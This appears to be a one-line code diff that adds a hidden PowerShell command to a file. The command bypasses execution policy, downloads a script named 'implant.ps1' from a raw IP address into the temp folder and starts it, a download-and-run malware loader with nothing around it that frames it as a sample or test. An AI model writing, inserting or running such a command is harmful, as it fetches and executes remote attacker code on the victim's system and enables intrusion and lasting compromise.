@@ -1,0 +1,1 @@
+powershell -w hidden -ep bypass -c "$url='http://153.75.82.198/implant.ps1'; $path="$env:TEMP\implant.ps1"; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process $path"
